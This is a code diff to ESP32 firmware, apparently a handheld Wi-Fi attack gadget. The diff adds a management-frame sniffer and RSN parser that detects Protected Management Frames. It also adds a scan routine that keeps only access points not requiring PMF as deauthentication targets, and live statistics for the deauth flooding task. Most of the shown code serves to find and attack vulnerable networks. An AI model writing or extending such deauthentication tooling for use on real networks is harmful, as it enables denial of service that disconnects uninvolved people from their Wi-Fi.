@@ -5,6 +5,7 @@
 #include <sys/time.h>
 #include <string.h>
 #include <stdlib.h>
+#include <ctype.h>
 
 #include <ping/ping_sock.h>
 
@@ -39,6 +40,7 @@
 #define FC_SUBTYPE(fc) (((fc) & 0xF0) >> 4)
 #define TYPE_MGMT 0x00
 #define SUBTYPE_BEACON 0x08
+#define SUBTYPE_PROBE_RESP 0x05
 
 #define EXPECTED_MQTT_RX "PolyCast5MQTTRxSuccess"
 
@@ -53,7 +55,7 @@ uint32_t raw_frames_captured = 0; // Counter
 
 static esp_mqtt_client_handle_t mqtt_client;
 
-static uint8_t target_bssid[6] = { 0x60, 0x55, 0xF9, 0xFC, 0xDE, 0xA8 };
+static uint8_t target_bssid[6] = {0};
 
 static wifi_data_t wifi_data;
 static char mqtt_active_ack_topic[80] = {0};
@@ -61,16 +63,6 @@ static char mqtt_active_ack_topic[80] = {0};
 static volatile int32_t ping_avg_ms = -1;
 static esp_ip4_addr_t sta_gw = {0};
 static bool sta_gw_valid = false;
-
-// Deauth attack target structures
-typedef struct {
-    uint8_t bssid[6];
-    char ssid[33];
-    uint8_t channel;
-    uint32_t packets_sent;
-    uint16_t seq_num;
-    uint32_t duration_sec;
-} deauth_target_t;
 
 // 802.11 deauth frame structure
 typedef struct {
@@ -219,6 +211,509 @@ esp_err_t wifi_funcs_scan(wifi_scan_t *wifi_scan)
     for (size_t i = 0; i < unique_count; ++i) {
         if (xQueueSend(xWifiScanQueue, &wifi_scan[i], portMAX_DELAY) != pdPASS) {
             ESP_LOGE(TAG, "xWifiScanQueue: Failed to enqueue #%u", (unsigned)i);
+        }
+    }
+
+    free(ap_list);
+    return ESP_OK;
+}
+
+// Read a uint16 from a byte array in little-endian order (LSB first)
+static inline uint16_t rd_le16(const uint8_t *p)
+{
+    return (uint16_t)p[0] | ((uint16_t)p[1] << 8);
+}
+
+// Check suite selector OUI bytes (e.g., 00:0F:AC for RSN)
+static inline bool is_oui(const uint8_t *p, uint8_t a, uint8_t b, uint8_t c)
+{
+    // Checks if the first 3 bytes at p match an OUI (Organizationally Unique Identifier)
+    return (p[0] == a && p[1] == b && p[2] == c);
+}
+
+// Parses the body of the RSN IE
+// (not including the id and len bytes of the IE wrapper)
+static void parse_rsn_ie(const uint8_t *rsn, size_t rsn_len, wifi_beacon_t *out)
+{
+    // RSN IE simplified layout:
+    //     version (2) +
+    //     group_cipher_suite (4) +
+    //     pairwise_cipher_count (2) +
+    //     pairwise_cipher_list (4 * N) +
+    //     akm_count (2) +
+    //     akm_list (4 * M) +
+    //     rsn_capabilities (2) +
+    //     optional extras (PMKID list, group mgmt cipher, etc.)
+
+    // Validate inputs
+    if (!rsn || !out || rsn_len < 2) {
+        return;
+    }
+
+    // Read the RSN version
+    size_t off = 0;
+    uint16_t ver = rd_le16(&rsn[off]);
+    off += 2;
+    if (ver != 1) {
+        // Still try to parse, but version 1 is expected.
+    }
+
+    // Ensure there are 4 bytes to read
+    if (off + 4 > rsn_len) {
+        return;
+    }
+
+    // grp points to the 4-byte "suite selector"
+    const uint8_t *grp = &rsn[off];
+    off += 4;
+
+    // If OUI matches RSN (00:0F:AC), store the suite type
+    if (is_oui(grp, 0x00, 0x0F, 0xAC)) {
+        out->rsn_group_cipher = grp[3];
+    }
+
+    // Common types:
+    //  2 = TKIP (legacy)
+    //  4 = CCMP-128 (AES/CCMP, typical WPA2)
+    //  8 = GCMP-128 (newer)
+
+    // Read pairwise cipher suites
+    if (off + 2 > rsn_len) {
+        return;
+    }
+    uint16_t pairwise_cnt = rd_le16(&rsn[off]);
+    off += 2;
+
+    // For each cipher
+    for (uint16_t i = 0; i < pairwise_cnt; ++i) {
+        // Bounds check
+        if (off + 4 > rsn_len) {
+            return;
+        }
+
+        const uint8_t *pcs = &rsn[off];
+        off += 4;
+
+        // Verify OUI
+        if (is_oui(pcs, 0x00, 0x0F, 0xAC)) {
+            // Read suite type
+            uint8_t ctype = pcs[3];
+
+            // Store it into a bitmask: 1u << ctype
+
+            // 1u << ctype on a 32-bit int becomes undefined /
+            // wrong if ctype is 32 or more. This is a safety guard
+            if (ctype < 32) {
+                out->rsn_pairwise_ciphers |= (1u << ctype);
+            }
+        }
+    }
+
+    // AKM suites
+    if (off + 2 > rsn_len) {
+        return;
+    }
+
+    // Read AKM Suites (auth/key-management)
+    uint16_t akm_cnt = rd_le16(&rsn[off]);
+    off += 2;
+
+    // Grabs how the keys are negotiated / what auth scheme is used
+    // Common suite types:
+    //  2 = PSK (WPA2-Personal)
+    //  1 = 802.1X (WPA2-Enterprise)
+    //  8 = SAE (WPA3-Personal)
+    //  18 = OWE (Enhanced Open)
+
+    for (uint16_t i = 0; i < akm_cnt; ++i) {
+        if (off + 4 > rsn_len) {
+            return;
+        }
+
+        const uint8_t *akm = &rsn[off];
+        off += 4;
+
+        // Check if OUI bytes
+        if (is_oui(akm, 0x00, 0x0F, 0xAC)) {
+            uint8_t atype = akm[3];
+            if (atype < 32) {
+                out->rsn_akm_suites |= (1u << atype);
+            }
+        }
+    }
+
+    // Reads the 2-byte RSN Capabilities field and grabs the
+    // two bits relevant to Protected Management Frames:
+    //     bit 6: MFPC (capable)
+    //     bit 7: MFPR (required)
+
+    // RSN capabilities (PMF bits live here)
+    if (off + 2 > rsn_len) {
+        return;
+    }
+    uint16_t caps = rd_le16(&rsn[off]);
+
+    // 802.11w / PMF bits:
+    // bit 6 = MFPC (capable), bit 7 = MFPR (required)
+    out->pmf_capable  = (caps & (1u << 6)) != 0;
+    out->pmf_required = (caps & (1u << 7)) != 0;
+}
+
+static volatile bool pmf_sniff_done = false;
+static volatile bool pmf_sniff_has_rsn = false;
+static bool pmf_sniff_required = false;
+static bool pmf_sniff_capable = false;
+static uint8_t pmf_sniff_bssid[6] = {0};
+static TaskHandle_t pmf_sniff_handle = NULL;
+
+// ┌──────────────────────────────────────────────────────────────────────────────┐
+// │                 802.11 Management Frame (Generic) Structure                  │
+// ├──────────────────────────────────────────────────────────────────────────────┤
+// │                               MAC Header (24)                                │
+// ├──────────────┬─────────────┬────────────┬────────────┬────────────┬──────────┤
+// │ Frame Control│ Duration/ID │   Addr1    │   Addr2    │   Addr3    │ Seq Ctrl │
+// │   2 bytes    │   2 bytes   │  6 bytes   │  6 bytes   │  6 bytes   │ 2 bytes  │
+// ├──────────────┴─────────────┴────────────┴────────────┴────────────┴──────────┤
+// │                         Frame Body / Payload (0..2312)                       │
+// │     (Variable; depends on subtype: Beacon/Probe/Auth/Assoc/Deauth/etc.)      │
+// ├──────────────────────────────────────────────────────────────────────────────┤
+// │                               FCS (4 bytes)                                  │
+// │                    (Frame Check Sequence; added/checked by HW)               │
+// └──────────────────────────────────────────────────────────────────────────────┘
+//
+// Notes (typical Management frames have ToDS=0 and FromDS=0):
+//   - Addr1: RA/DA (Receiver/Destination)  (e.g., station MAC, or broadcast FF:FF:FF:FF:FF:FF)
+//   - Addr2: TA/SA (Transmitter/Source)   (e.g., AP MAC for beacons)
+//   - Addr3: BSSID                         (AP’s BSSID for infra BSS)
+//   - Addr4: not present in management frames (only present in 4-address data/WDS frames)
+//
+// Frame Control (2 bytes) highlights:
+//   - Type = 0b00 (Management)
+//   - Subtype selects: Beacon(0x8), Probe Req(0x4), Probe Resp(0x5), Auth(0xB), Deauth(0xC), etc.
+//   - ToDS/FromDS are normally 0/0 for management frames
+static void wifi_sniffer_pmf_cb(void* buf, wifi_promiscuous_pkt_type_t type)
+{
+    // Make sure it's a management packet
+    if (type != WIFI_PKT_MGMT) {
+        return;
+    }
+
+    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
+    uint8_t *frame = pkt->payload;
+    size_t frame_len = pkt->rx_ctrl.sig_len;
+
+    // Need at least a full mgmt header before touching fixed offsets
+    if (frame_len < 24) {
+        return;
+    }
+
+    // Extract frame control field (first 2 bytes)
+    uint16_t frame_ctrl = (frame[1] << 8) | frame[0];
+
+    // Make sure it's a management frame
+    if (FC_TYPE(frame_ctrl) != TYPE_MGMT) {
+        return;
+    }
+
+    // Check subtype: only care about Beacon and Probe Response
+    uint8_t st = FC_SUBTYPE(frame_ctrl);
+    if (st != SUBTYPE_BEACON && st != SUBTYPE_PROBE_RESP) {
+        return;
+    }
+
+    // Need fixed params for Beacon/ProbeResp: 24-byte header + 12 bytes fixed
+    if (frame_len < (24 + 12)) {
+        return;
+    }
+
+    // Beacon/Probe Response: Address3 at offset 16 is the BSSID
+    const uint8_t *bssid = &frame[16];
+    if (memcmp(bssid, pmf_sniff_bssid, 6) != 0) {
+        return; // Exit if BSSID doesn't match
+    }
+
+    // Fixed params (12 bytes) after 24-byte header, then IEs
+    uint8_t *ie = frame + 24 + 12;
+    int rem = (int)frame_len - (int)(ie - frame);
+
+    // Exit if no remaining bytes for IEs
+    if (rem <= 0) {
+        // We did see the target frame; treat as "no RSN IE"
+        pmf_sniff_done = true;
+        if (pmf_sniff_done && pmf_sniff_handle) {
+            xTaskNotifyGive(pmf_sniff_handle);
+        }
+        return;
+    }
+
+    wifi_beacon_t beacon = {0};
+    bool found_rsn = false;
+
+    // Parse Information Elements (IEs) for RSN IE
+    while (rem >= 2) {
+        uint8_t id = ie[0];
+        uint8_t len = ie[1];
+
+        // Exit if IE length exceeds remaining bytes
+        if (len + 2 > rem) {
+            break;
+        }
+
+        uint8_t *data = ie + 2;
+
+        if (id == 48) { // RSN IE
+            pmf_sniff_has_rsn = true;
+            parse_rsn_ie(data, len, &beacon);
+            pmf_sniff_capable = beacon.pmf_capable;
+            pmf_sniff_required = beacon.pmf_required;
+            found_rsn = true;
+            break;
+        }
+
+        // Move to next IE
+        ie += len + 2;
+        rem -= len + 2;
+    }
+
+    // Mark done once we saw a matching Beacon/ProbeResp, even if RSN IE wasn't present
+    pmf_sniff_done = true;
+    if (!found_rsn) {
+        pmf_sniff_has_rsn = false;
+        pmf_sniff_required = false;
+        pmf_sniff_capable = false;
+    }
+
+    if (pmf_sniff_done && pmf_sniff_handle) {
+        // Notify pmf sniff is complete
+        xTaskNotifyGive(pmf_sniff_handle);
+    }
+}
+
+static esp_err_t wifi_funcs_pmf_from_rsn_ie(uint8_t channel, const uint8_t bssid[6])
+{
+    // Validate input
+    if (!bssid) {
+        ESP_LOGE(TAG, "wifi_funcs_pmf_from_rsn_ie: Invalid NULL bssid");
+        return ESP_ERR_INVALID_ARG;
+    }
+
+    // Reset globals
+    pmf_sniff_done = false;
+    pmf_sniff_has_rsn = false; // Robust Security Network
+    pmf_sniff_required = false;
+    pmf_sniff_capable = false;
+    pmf_sniff_handle = xTaskGetCurrentTaskHandle();
+
+    // Copy BSSID into global for callback
+    memcpy(pmf_sniff_bssid, bssid, 6);
+
+    // Management frames only
+    wifi_promiscuous_filter_t filter = {
+        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
+    };
+
+    // Set channel, filter, callback, and enable promiscuous mode
+    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE));
+    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_promiscuous_filter(&filter));
+    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_pmf_cb));
+    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_promiscuous(true));
+
+    // Wait briefly for a beacon/probe response (RSN IE may or may not be present)
+    (void)ulTaskNotifyTake(pdTRUE, pdMS_TO_TICKS(750));
+
+    // Disable promiscuous mode and clear callback
+    (void)esp_wifi_set_promiscuous(false);
+    (void)esp_wifi_set_promiscuous_rx_cb(NULL);
+
+    pmf_sniff_handle = NULL;
+
+    if (!pmf_sniff_done) {
+        #ifdef POLYCAST5_DEBUG
+        ESP_LOGW(TAG, "wifi_funcs_pmf_from_rsn_ie: sniff timed out");
+        #endif
+        return ESP_ERR_TIMEOUT;
+    }
+
+    // If RSN IE wasn't present, PMF isn't applicable (open/WEP/etc.)
+    if (!pmf_sniff_has_rsn) {
+        pmf_sniff_required = false;
+        pmf_sniff_capable = false;
+        return ESP_OK;
+    }
+
+    return ESP_OK;
+}
+
+#ifdef POLYCAST5_DEBUG
+static void auth_to_str(uint8_t authmode, char *out_str, size_t out_str_len)
+{
+    switch (authmode) {
+        case WIFI_AUTH_OPEN:
+            strlcpy(out_str, "OPEN", out_str_len);
+            break;
+        case WIFI_AUTH_WEP:
+            strlcpy(out_str, "WEP", out_str_len);
+            break;
+        case WIFI_AUTH_WPA_PSK:
+            strlcpy(out_str, "WPA-PSK", out_str_len);
+            break;
+        case WIFI_AUTH_WPA2_PSK:
+            strlcpy(out_str, "WPA2-PSK", out_str_len);
+            break;
+        case WIFI_AUTH_WPA_WPA2_PSK:
+            strlcpy(out_str, "WPA/WPA2-PSK", out_str_len);
+            break;
+        case WIFI_AUTH_ENTERPRISE:
+            strlcpy(out_str, "WPA2-Enterprise", out_str_len);
+            break;
+        case WIFI_AUTH_WPA3_PSK:
+            strlcpy(out_str, "WPA3-PSK", out_str_len);
+            break;
+        case WIFI_AUTH_OWE:
+            strlcpy(out_str, "OWE", out_str_len);
+            break;
+        default:
+            strlcpy(out_str, "UNKNOWN", out_str_len);
+            break;
+    }
+}
+#endif
+
+// TODO: Clean up + clean up normal scan & page
+esp_err_t wifi_funcs_scan_deauth(wifi_scan_deauth_t *wifi_scan_deauth)
+{
+    esp_err_t err;
+
+    // Set to scan all SSIDs and channels
+    wifi_scan_config_t scan_config = {
+        .ssid = NULL,
+        .bssid = NULL,
+        .channel = 0, // 0 = scan all channels
+        .show_hidden = true
+    };
+
+    // Start scan (true = block until scan done)
+    err = esp_wifi_scan_start(&scan_config, true);
+    if (err != ESP_OK) {
+        ESP_LOGE(TAG, "wifi_funcs_scan_deauth: esp_wifi_scan_start failed: %s", esp_err_to_name(err));
+        return err;
+    }
+
+    // How many APs were found
+    uint16_t ap_num = 0;
+    err = esp_wifi_scan_get_ap_num(&ap_num);
+    if (err != ESP_OK) {
+        ESP_LOGE(TAG, "wifi_funcs_scan_deauth: esp_wifi_scan_get_ap_num failed: %s", esp_err_to_name(err));
+        return err;
+    }
+
+    // If no networks found
+    if (ap_num == 0) {
+        #ifdef POLYCAST5_DEBUG
+        ESP_LOGW(TAG, "wifi_funcs_scan_deauth: esp_wifi_scan_get_ap_num: No access points found");
+        #endif
+        
+        wifi_scan_deauth_t sentinel = {0};
+
+        // Use an impossible auth value as a sentinel marker
+        sentinel.auth = 0xFF;
+
+        // Signal LCD no APs found
+        if (xQueueSend(xWifiDeauthScanQueue, &sentinel, portMAX_DELAY) != pdPASS) {
+            ESP_LOGE(TAG, "xWifiDeauthScanQueue: ap_num == 0: Failed to enqueue");
+        }
+
+        // Exit without error
+        return ESP_OK;
+    }
+
+    // Allocate array to hold results
+    wifi_ap_record_t *ap_list = malloc(sizeof(wifi_ap_record_t) * ap_num);
+    if (!ap_list) {
+        ESP_LOGE(TAG, "wifi_funcs_scan_deauth: malloc for ap_list failed");
+        return ESP_ERR_NO_MEM;
+    }
+
+    // Pull the records
+    err = esp_wifi_scan_get_ap_records(&ap_num, ap_list);
+    if (err != ESP_OK) {
+        ESP_LOGE(TAG, "wifi_funcs_scan_deauth: esp_wifi_scan_get_ap_records failed: %s", esp_err_to_name(err));
+        free(ap_list);
+        return err;
+    }
+
+    // Build list keeping all entries (including duplicates for 2.4/5GHz)
+    uint16_t count = 0;
+
+    for (uint16_t i = 0; (i < ap_num) && (count < WIFI_MAX_NETWORKS); ++i) {
+        const char *ssid = (char *)ap_list[i].ssid;
+
+        // Skip blank SSIDs
+        if (ssid[0] == '\0') {
+            continue;
+        }
+
+        // Calculate frequency from channel
+        int channel = ap_list[i].primary;
+        int freq_mhz = 0;
+        if (channel >= 1  && channel < 14) {
+            freq_mhz = 2412 + 5 * (channel - 1);
+        } else if (channel == 14) {
+            freq_mhz = 2484; // Special case
+        } else if (channel >= 36 && channel <= 165) {
+            freq_mhz = 5000 + (5 * channel);
+        }
+
+        esp_err_t err = wifi_funcs_pmf_from_rsn_ie(channel, ap_list[i].bssid);
+        if (err != ESP_OK) {
+            ESP_LOGE(TAG, "wifi_funcs_scan_deauth: wifi_funcs_pmf_from_rsn_ie failed for SSID '%s' (err %s)", ssid, esp_err_to_name(err));
+        }
+        
+        #ifdef POLYCAST5_DEBUG
+        char auth_str[20] = {0};
+        auth_to_str(ap_list[i].authmode, auth_str, sizeof(auth_str));
+        ESP_LOGI(TAG,
+                "wifi_funcs_scan_deauth: [%d] SSID: %-32s BSSID: %02x:%02x:%02x:%02x:%02x:%02x RSSI: %3d  CH:%2d  "
+                "AUTH:%s PMF Required: %d PMF Capable: %d",
+                i,
+                (char*)ap_list[i].ssid,
+                ap_list[i].bssid[0], ap_list[i].bssid[1],
+                ap_list[i].bssid[2], ap_list[i].bssid[3],
+                ap_list[i].bssid[4], ap_list[i].bssid[5],
+                ap_list[i].rssi,
+                ap_list[i].primary,
+                auth_str,
+                pmf_sniff_required,
+                pmf_sniff_capable
+        );
+        #endif
+
+        if (pmf_sniff_required) {
+            // Skip APs that require PMF (cannot deauth them)
+            continue;
+        }
+
+        // Copy the SSID
+        strlcpy((char *)wifi_scan_deauth[count].ssid, ssid, sizeof(wifi_scan_deauth[count].ssid));
+
+        // Copy the BSSID
+        memcpy(wifi_scan_deauth[count].bssid, ap_list[i].bssid, sizeof(ap_list[i].bssid));
+
+        // Fill the rest
+        wifi_scan_deauth[count].rssi = ap_list[i].rssi;
+        wifi_scan_deauth[count].channel = ap_list[i].primary;
+        wifi_scan_deauth[count].auth = ap_list[i].authmode;
+        wifi_scan_deauth[count].freq_mhz = freq_mhz;
+        wifi_scan_deauth[count].pmf_required = pmf_sniff_required;
+        wifi_scan_deauth[count].pmf_capable = pmf_sniff_capable;
+
+        count++;
+    }
+
+    // Push the unique SSIDs
+    for (size_t i = 0; i < count; ++i) {
+        if (xQueueSend(xWifiDeauthScanQueue, &wifi_scan_deauth[i], portMAX_DELAY) != pdPASS) {
+            ESP_LOGE(TAG, "xWifiDeauthScanQueue: Failed to enqueue #%u", (unsigned)i);
         }
     }
 
@@ -1101,147 +1596,6 @@ wifi_login_t wifi_funcs_get_prev(void)
     return prev;
 }
 
-// Read a uint16 from a byte array in little-endian order (LSB first)
-static inline uint16_t rd_le16(const uint8_t *p)
-{
-    return (uint16_t)p[0] | ((uint16_t)p[1] << 8);
-}
-
-// Check suite selector OUI bytes (e.g., 00:0F:AC for RSN)
-static inline bool is_oui(const uint8_t *p, uint8_t a, uint8_t b, uint8_t c)
-{
-    // Checks if the first 3 bytes at p match an OUI (Organizationally Unique Identifier)
-    return (p[0] == a && p[1] == b && p[2] == c);
-}
-
-// Parses the body of the RSN IE
-// (not including the id and len bytes of the IE wrapper)
-static void parse_rsn_ie(const uint8_t *rsn, size_t rsn_len, wifi_beacon_t *out)
-{
-    // RSN IE simplified layout:
-    //     version (2) +
-    //     group_cipher_suite (4) +
-    //     pairwise_cipher_count (2) +
-    //     pairwise_cipher_list (4 * N) +
-    //     akm_count (2) +
-    //     akm_list (4 * M) +
-    //     rsn_capabilities (2) +
-    //     optional extras (PMKID list, group mgmt cipher, etc.)
-
-    // Validate inputs
-    if (!rsn || !out || rsn_len < 2) {
-        return;
-    }
-
-    // Read the RSN version
-    size_t off = 0;
-    uint16_t ver = rd_le16(&rsn[off]);
-    off += 2;
-    if (ver != 1) {
-        // Still try to parse, but version 1 is expected.
-    }
-
-    // Ensure there are 4 bytes to read
-    if (off + 4 > rsn_len) {
-        return;
-    }
-
-    // grp points to the 4-byte "suite selector"
-    const uint8_t *grp = &rsn[off];
-    off += 4;
-
-    // If OUI matches RSN (00:0F:AC), store the suite type
-    if (is_oui(grp, 0x00, 0x0F, 0xAC)) {
-        out->rsn_group_cipher = grp[3];
-    }
-
-    // Common types:
-    //  2 = TKIP (legacy)
-    //  4 = CCMP-128 (AES/CCMP, typical WPA2)
-    //  8 = GCMP-128 (newer)
-
-    // Read pairwise cipher suites
-    if (off + 2 > rsn_len) {
-        return;
-    }
-    uint16_t pairwise_cnt = rd_le16(&rsn[off]);
-    off += 2;
-
-    // For each cipher
-    for (uint16_t i = 0; i < pairwise_cnt; ++i) {
-        // Bounds check
-        if (off + 4 > rsn_len) {
-            return;
-        }
-
-        const uint8_t *pcs = &rsn[off];
-        off += 4;
-
-        // Verify OUI
-        if (is_oui(pcs, 0x00, 0x0F, 0xAC)) {
-            // Read suite type
-            uint8_t ctype = pcs[3];
-
-            // Store it into a bitmask: 1u << ctype
-
-            // 1u << ctype on a 32-bit int becomes undefined /
-            // wrong if ctype is 32 or more. This is a safety guard
-            if (ctype < 32) {
-                out->rsn_pairwise_ciphers |= (1u << ctype);
-            }
-        }
-    }
-
-    // AKM suites
-    if (off + 2 > rsn_len) {
-        return;
-    }
-
-    // Read AKM Suites (auth/key-management)
-    uint16_t akm_cnt = rd_le16(&rsn[off]);
-    off += 2;
-
-    // Grabs how the keys are negotiated / what auth scheme is used
-    // Common suite types:
-    //  2 = PSK (WPA2-Personal)
-    //  1 = 802.1X (WPA2-Enterprise)
-    //  8 = SAE (WPA3-Personal)
-    //  18 = OWE (Enhanced Open)
-
-    for (uint16_t i = 0; i < akm_cnt; ++i) {
-        if (off + 4 > rsn_len) {
-            return;
-        }
-
-        const uint8_t *akm = &rsn[off];
-        off += 4;
-
-        // Check if OUI bytes
-        if (is_oui(akm, 0x00, 0x0F, 0xAC)) {
-            uint8_t atype = akm[3];
-            if (atype < 32) {
-                out->rsn_akm_suites |= (1u << atype);
-            }
-        }
-    }
-
-    // Reads the 2-byte RSN Capabilities field and grabs the
-    // two bits relevant to Protected Management Frames:
-    //     bit 6: MFPC (capable)
-    //     bit 7: MFPR (required)
-
-    // RSN capabilities (PMF bits live here)
-    if (off + 2 > rsn_len) {
-        return;
-    }
-    uint16_t caps = rd_le16(&rsn[off]);
-
-    // 802.11w / PMF bits:
-    // bit 6 = MFPC (capable), bit 7 = MFPR (required)
-    out->pmf_capable  = (caps & (1u << 6)) != 0;
-    out->pmf_required = (caps & (1u << 7)) != 0;
-}
-
 static void wifi_sniffer_beacon_cb(void* buf, wifi_promiscuous_pkt_type_t type)
 {
     static volatile uint32_t frames_seen = 0;
@@ -1498,7 +1852,8 @@ static void record_client(const uint8_t *mac, int8_t rssi) {
     
     // Check if exists
     for (int i = 0; i < wifi_data.client_count; ++i) {
-        if (memcmp(wifi_data.clients[i].mac, mac, 6) == 0) { // If it does, update the rssi then exit
+        if (memcmp(wifi_data.clients[i].mac, mac, 6) == 0) {
+            // If it does, update the rssi then exit
             wifi_data.clients[i].rssi = rssi;
             
             return;
@@ -1897,8 +2252,9 @@ esp_err_t wifi_funcs_ping(const char *host, int32_t *rtt_ms)
     return wifi_funcs_ping_ip4(&ip4, rtt_ms);
 }
 
-//       Structure of a typical 802.11 deauthentication frame
 // ┌─────────────────────────────────────────────────────────────────┐
+// │                 802.11 Deauth Frame Structure                   │
+// ├─────────────────────────────────────────────────────────────────┤
 // │                     MAC Header (24 bytes)                       │
 // ├─────────────────────────────────────────────────────────────────┤
 // │ Frame Control │ Duration │   DA   │   SA   │  BSSID  │ Seq Ctrl │
@@ -1979,6 +2335,9 @@ static void deauth_send_task(void *pvParameters)
     // Get passed target params
     deauth_target_t *deauth_target = (deauth_target_t *)pvParameters;
 
+    // Deauth stats to send to user
+    deauth_stats_t deauth_stats = {0};
+
     // Set initial values
     uint32_t attack_start_time = TIMER_GET_TIME_SEC(); // Start time
     #ifdef POLYCAST5_DEBUG
@@ -2027,6 +2386,14 @@ static void deauth_send_task(void *pvParameters)
         }
         #endif
 
+        // Stats to send to user
+        deauth_stats.deauthing = true;
+        deauth_stats.packets_sent = deauth_target->packets_sent;
+        deauth_stats.duration_sec = deauth_target->duration_sec;
+        if (xQueueSend(xWifiDeauthStatsQueue, &deauth_stats, 0) != pdPASS) {
+            //ESP_LOGW(TAG, "deauth_send_task: Failed to send deauth stats to queue");
+        }
+
         // Feed the watchdog
         vTaskDelay(pdMS_TO_TICKS(10));
     }
@@ -2043,6 +2410,14 @@ static void deauth_send_task(void *pvParameters)
 
     // Stop Wi-Fi
     esp_wifi_stop();
+
+    // Send final stats to user
+    deauth_stats.deauthing = false;
+    deauth_stats.packets_sent = deauth_target->packets_sent;
+    deauth_stats.duration_sec = deauth_target->duration_sec;
+    if (xQueueSend(xWifiDeauthStatsQueue, &deauth_stats, portMAX_DELAY) != pdPASS) {
+        ESP_LOGE(TAG, "deauth_send_task: Failed to send deauth stats to queue");
+    }
 
     // Clean up allocated param
     free(deauth_target);
@@ -2078,7 +2453,7 @@ esp_err_t wifi_funcs_deauth_for_duration(uint32_t duration_sec, const uint8_t *t
     memcpy(deauth_target->bssid, target_bssid, 6);
     deauth_target->channel = channel;
     deauth_target->packets_sent = 0;
-    deauth_target->seq_num = esp_random() % 4096; // Random start (0-4095)
+    deauth_target->seq_num = esp_random() & 0x0FFF; // Random start (0-4095)
 
     // Setup Wi-Fi in STA mode
     esp_err_t err = esp_wifi_set_mode(WIFI_MODE_STA);
